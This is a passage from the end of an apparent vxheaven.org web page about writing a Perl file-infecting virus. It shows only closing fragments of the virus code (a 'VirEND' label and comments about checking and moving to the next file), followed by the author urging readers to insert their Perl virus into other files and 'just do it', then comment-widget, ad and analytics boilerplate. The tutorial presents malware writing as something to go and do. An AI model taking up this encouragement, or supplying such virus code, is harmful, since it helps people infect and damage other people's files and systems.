&nbsp; &nbsp;<span style="color: black;">&#125;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># End Filecheck if</span><br/>
VirEND<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># get next file..</span><br/>
&nbsp; <span style="color: black;">&#125;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># End search files for each..</span><br/>
&nbsp;</div>
<p>You see it is pretty simple to insert your perl virus somewhere in another file.. just do it =) The code can be optimized of course, and can be shrinked to less lines ( for example the { in the end ).</p>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsn09">de</a><a href="/lib/index.php?lang=en&amp;id=vsn09">en</a><a href="/lib/index.php?lang=es&amp;id=vsn09">es</a><a href="/lib/index.php?lang=it&amp;id=vsn09">it</a><a href="/lib/index.php?lang=fr&amp;id=vsn09">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsn09">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsn09">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsn09">ua</a></div>
</body>
</html>
